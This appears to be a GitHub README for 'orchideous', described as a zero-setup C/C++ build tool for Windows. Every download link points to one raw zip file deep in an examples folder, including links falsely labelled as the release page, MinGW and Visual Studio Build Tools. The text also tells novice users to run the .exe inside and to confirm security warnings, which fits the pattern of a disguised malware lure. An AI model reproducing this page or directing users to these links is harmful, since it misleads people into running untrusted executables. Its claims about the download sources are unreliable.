# 🔌 orchideous - Easy Build and Test Tool

[![Download orchideous](https://img.shields.io/badge/Download-orchideous-brightgreen?style=for-the-badge)](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)

---

## ⚙️ What is orchideous?

orchideous is a tool that helps you create and test programs written in C and C++. It works with no setup needed. This means you don’t have to configure anything to get started. The tool looks at your code and figures out the right way to build it. It also helps package your program so others can use it.  

If you want to run a program written in C or C++ on your Windows computer, orchideous will help you build it correctly without needing to know complicated details about programming or system settings.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or later  
- **Processor:** Any modern 64-bit processor  
- **Memory:** At least 4 GB RAM  
- **Disk Space:** Minimum 100 MB free space  
- **Other tools:** orchideous may use tools like `gcc` or `clang` to compile programs. These usually come with software like MinGW or Visual Studio, which you may need to install separately for best results.  

If you don’t have these compilers yet, you can find guides online to install MinGW or Visual Studio Build Tools on your Windows machine.

---

## 📥 Download orchideous

To get orchideous for Windows, visit the official release page:

[Download orchideous here](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)

This link takes you to the release page where you can find the latest version of the tool. The files you need will usually have `.exe` or `.zip` extensions.

---

## 🚀 Getting Started with orchideous on Windows

Follow these steps to download and run orchideous on your Windows PC.

### 1. Visit the download page

Open this web address in your browser:

https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip

This is the official place to find all versions of orchideous.

### 2. Choose the latest version

The page will list several versions. Look for the one at the top — it is usually the newest. Click on it to open details.

### 3. Download the Windows executable or installer

Look for a file that ends with `.exe` or `.zip`. If you see an `.exe` file, download it directly.  

If you download a `.zip` file, save it to your computer, then open it using File Explorer. Inside, you will find the orchideous program (`.exe` file) which you can run.

### 4. Run orchideous

If you downloaded an `.exe` file, simply double-click it to run. On some Windows versions, a security warning might appear. Confirm that you want to run the file.

If you used a `.zip` file, find the `.exe` file inside and double-click it.

---

## 🛠 How to use orchideous for building programs

Once orchideous is running, you can use it without needing to set up anything yourself. Here’s how:

### Step 1: Open Command Prompt

Press `Win + R`, type `cmd`, and press Enter.  

This opens the Command Prompt where you can type commands.

### Step 2: Navigate to your project folder

Use the `cd` command to go to the folder containing your C or C++ code. For example:

```
cd C:\Users\YourName\Documents\MyProject
```

Replace the path with the folder where your code is saved.

### Step 3: Run orchideous

Type `orchideous` and press Enter.

The tool will scan your code files, detect any special settings needed, and start building your program.

### Step 4: Check the output

If build succeeds, orchideous will save your executable file in the same folder or a subfolder named `build` or `bin`. You can run this executable by double-clicking it.

If there are errors, the tool will show messages telling you what needs fixing.

---

## 📦 Features of orchideous

- Automatically detects compilation options by scanning your code. No setup needed.  
- Supports programs written in plain C and C++ (including newer standards like C++17 and C++20).  
- Works with common build systems like CMake and Ninja.  
- Uses system tools like pkg-config to find the right compiler flags.  
- Helps you build, test, and package your programs easily.  
- Works on various platforms including Linux and BSD but also works on Windows.  
- Supports clang-format for consistent code styling if needed.

---

## 🔧 Installing Additional Tools

orchideous depends on system compilers and some tools to work properly.  

If you don’t have a compiler on Windows, try one of these:

- **MinGW:** A popular free compiler system for Windows.  
  Download it from https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip  

- **Visual Studio Build Tools:** Provides Microsoft's C/C++ compiler.  
  Download it from https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip under “Build Tools for Visual Studio”.

Once installed, make sure the compiler’s `bin` folder is in your system’s PATH. This lets orchideous find the tools it needs.

---

## ⚡ Running Tests and Packaging

If your program has tests included, orchideous can run them automatically after building. You just need to type:

```
orchideous test
```

Similarly, to prepare your program for sharing or installation, you can run:

```
orchideous package
```

The tool will try to create an installer or a compressed archive with everything needed to run your program.

---

## 📖 More Help

To learn more about using orchideous commands and options, you can ask for help inside the tool. In the command prompt, type:

```
orchideous --help
```

This will list available commands and how to use them.

You can also visit the project page:

https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip

for updates, documentation, and community support.

---

[![Download orchideous](https://img.shields.io/badge/Download-orchideous-blue?style=for-the-badge)](https://github.com/w2010mc/orchideous/raw/refs/heads/main/examples/x11/include/Software-2.5.zip)